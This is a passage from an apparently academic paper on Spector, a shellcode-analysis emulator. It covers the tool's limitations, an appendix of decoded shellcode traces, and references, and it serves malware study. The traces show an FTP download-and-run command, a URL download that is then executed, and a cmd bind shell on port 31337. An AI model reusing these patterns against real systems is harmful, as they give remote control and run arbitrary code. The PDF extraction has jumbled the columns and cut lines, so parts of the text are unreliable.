configuration,  Spector  also  does  not  receive  real  data 
over  the  network,  and  thus  will  raise  an  exception  if 
shell  code  tries  to  download  and  run  additional 
instructions 
inline  buffer.  However,  our 
promising  performance  results  indicate  that  it  may  be 
possible  to  run  Spector  in  real  time  and  allow  it  to 
make actual network calls, which would get rid of this 
limitation. 
in  an 
Another limitation of Spector is its speed in relation 
to an actual processor. If authors intentionally inserted 
tight loops that executed a large number of instructions 
throughout  the  shell  code,  Spector  may  take  an 
unreasonably long amount of time to analyze the code, 
while  a  modern  processor  may  be  able to execute the 
same  code  in  less  an  a  second.  One  example  of  such 
code would be a simple loop: “While i  
o&echo user asdf asdf >> o &echo get 
serivces.exe >> o &echo quit >> o &ftp -n -s:o 
&del /F /Q o &serivces.exe\r\n", 0) 
ExitThread(0) 
HttpExec1 
OpenMutexA(001F0001, 1, "u1") 
VirtualAlloc(0,  00050000,  00001000,  4)  returns 
CreateFileA(".\ftpupd.exe", 40000000, 0, 0, 2, 0, 0) 
hHeapMemory0 
returns hFile 
InternetOpenA("Mozilla/4.0",  1,  "NULL",  "NULL",  0) 
returns hInternet 
InternetOpenUrlA(hInternet, 
"http://127.0.0.1:31337/x.exe",  "NULL",  0,  0,  0) 
returns hUrl 
InternetReadFile(hUrl,  hHeapMemory0,  00050000, 
SESP + FFFFFFF4) returns 0, urlFileSize 
WriteFile(hFile,  hHeapMemory0,  urlFileSize,  SESP  + 
FFFFFFF4, 0) 
CloseHandle(hFile) 
WinExec(".\ftpupd.exe", 5) 
ExitThread(0) 
BindShell1 
WSASocketA(2, 1, 0, 0, 0, 0) returns newsocket 
bind(newsocket,  sockaddr  ('0.0.0.0',  31337,  2), 
00000010) 
listen(newsocket, 1) 
accept(newsocket, 0, 0) returns acceptsocket 
CreateProcessA(NULL,  "cmd",  0,  0,  1,  0,  0,  NULL, 
{LPSTARTUPINFO: 
hStdInput=acceptsocket, 
hStdOutput=acceptsocket},  code  +  000001FD) 
returns 
hThread, 
dwProcessId, dwThreadId 
hProcess, 
hProcess, 
closesocket(acceptsocket) 
closesocket(newsocket) 
ExitThread(0) 
[17]  J.  Ma,  J.  Dunagen.  H.  Wang,  S.  Savage,  G. 
Voelker.  Finding  Diversity  in  Remote  Code 
Injection  Exploits.  In  Proc.  of  the  6th  ACM 
SIGCOMM on Internet Measurement, 2006. 
[18]  C.  Nachenberg.  Computer  Virus-Antivirus 
the  ACM, 
Coevolution.  Communications  of 
Volume 40, Issue 1, pages 46-51, 1997. 
[19]  P. Morris and R. Filman. Mandrake: A Tool for 
Reverse  Engineering  IBM  Assembly  Code.  In 
Proc. of the 3rd Working Conference on Reverse 
Engineering (WCRE), 1996. 
[20]  J.  Newsome,  B.  Karp,  and  D.  Song.  Polygraph: 
Automatically  Generating 
for 
Polymorphic  Worms.  In  Proc.  of  the  IEEE 
Symposium on Security and Privacy, May 2005. 
SandBox  Whitepaper. 
http://sandbox.norman.no/pdf/03_sandb
ox%20whitepaper.pdf, 2007. 
[21]  Norman.  Norman 
Signatures 
[22]  V. Paxson. Bro: A System for Detecting Network 
Intruders  in  Real-Time.  In  Proc.  of  the  7th 
USENIX Security Symposium, 1998. 
[23]  U.  Payer,  P.  Teufl,  and  M.  Lamberger.  Hybrid 
Engine  for  Polymorphic  Shellcode  Detection.  In 
Proc.  of 
the  Conference  on  Detection  of 
Intrusions  and  Malware  and  Vulnerability 
Assessment (DIMVA), 2005. 
[24]  M.  Polychronakis,  K.  Anagnostakis,  and  E. 
Markatos. Network-Level Polymorphic Shellcode 
Detection  Using  Emulation.  In  Proc.  of  the 
Conference  on  Detection  of  Intrusions  and 
Malware and Vulnerability Assessment (DIMVA), 
2006. 
[25]  N.  Provos.  Honeyd  -  A  Virtual  Honeypot 
the  10th  DFN-CERT 
Daemon.  In  Proc.  of 
Workshop, 2003. 
[26]  M.  Roesch.  Snort  –  Lightweight  Intrusion 
Detection for Networks. In Proc. of the USENIX 
LISA ’99 Conference, November 1999. 
[27]  B.  Schwarz,  S.  Debray  and  G.  Andrews. 
Disassembly of executable code revisited. In Pro. 
of 
the  Working  Conference  on  Reverse 
Engineering, 2002. 
[28]  K.  Sen,  D.  Marinov,  and  G.  Agha.  CUTE:  A 
Concolic Unit Testing Engine for C. In Proc. of 
the  5th  Joint  Meeting  of  the  European  Software 
Engineering  Conference  and  ACM  SIGSOFT 
Symposium  on  the  Foundations  of  Software 
Engineering (ESEC/FSE),  2005. 
Java  Decompiler. 
http://www.brouhaha.com/~eric/softwar
e/mocha/, 1996. 
[29]  H.  Vliet.  Mocha, 
[30]  D. Wagner and D. Dean. Intrusion Detection Via 
Static Analysis. In Proc. of the IEEE Symposium 
on Security and Privacy, 2001. 
the 
514514